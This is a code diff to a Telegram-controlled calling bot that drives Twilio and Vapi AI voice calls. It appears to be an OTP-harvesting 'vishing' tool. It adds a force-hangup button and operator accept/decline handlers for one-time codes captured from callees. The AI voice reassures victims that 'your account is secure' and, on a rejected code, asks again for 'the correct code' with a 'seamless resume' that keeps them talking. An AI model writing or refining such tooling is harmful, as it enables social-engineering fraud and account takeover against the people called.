@@ -5833,6 +5833,25 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
         return
 
     # --- OTP accept/decline callbacks ---
+    if call.data.startswith("force_hangup_"):
+        sid = call.data[len("force_hangup_"):]
+        bot.answer_callback_query(call.id, "📴 Hanging up…")
+        session = get_call_session(sid)
+        vapi_id = (session.get("vapi_call_id") if session else None) or sid
+
+        def _do_hang():
+            from handlers.vapi_webhooks import _hangup_call
+            try:
+                _hangup_call(vapi_id, sid)
+            except Exception as e:
+                logger.debug(f"Force hangup error: {e}")
+            cancel_otp_timer(sid)
+            cleanup_call_session(sid)
+
+        threading.Thread(target=_do_hang, daemon=True).start()
+        bot.send_message(chat_id, f"📴 Force hangup requested for {sid}.")
+        return
+
     if call.data.startswith("send_otp_"):
         call_sid = call.data.split("_")[2]
         bot.answer_callback_query(call.id)
@@ -5861,7 +5880,7 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
             from services.vapi_service import say_to_assistant
             import time
             try:
-                say_to_assistant(vapi_id, "Your identity is verified. The account is secure. Goodbye.")
+                say_to_assistant(vapi_id, "Your identity is verified. Your account is secure. Goodbye.")
                 time.sleep(2)
             except Exception as e:
                 logger.debug(f"Vapi say on accept: {e}")
@@ -5870,6 +5889,12 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
             twilio_end_call(call_sid)
         except Exception as e:
             logger.debug(f"Twilio end_call on accept: {e}")
+        if vapi_id:
+            from services.vapi_service import end_call as vapi_end_call
+            try:
+                vapi_end_call(vapi_id)
+            except Exception as e:
+                logger.debug(f"Vapi end_call on accept: {e}")
         return
 
     if call.data.startswith("otp_decline_"):
@@ -5896,8 +5921,14 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
                     time.sleep(2)
                     from services.twilio_service import end_call as twilio_end_call
                     twilio_end_call(call_sid)
+                    from services.vapi_service import end_call as vapi_end_call
+                    vapi_end_call(vapi_id)
                 else:
+                    # Seamless resume: release the hold and reset state so the AI
+                    # asks again naturally (timer will re-arm on next capture).
                     say_to_assistant(vapi_id, "That code didn't match. Please check and give me the correct code.")
+                    session["otp_status"] = "waiting"
+                    session["otp_hold_active"] = False
             except Exception as e:
                 logger.debug(f"Vapi say on decline: {e}")
 
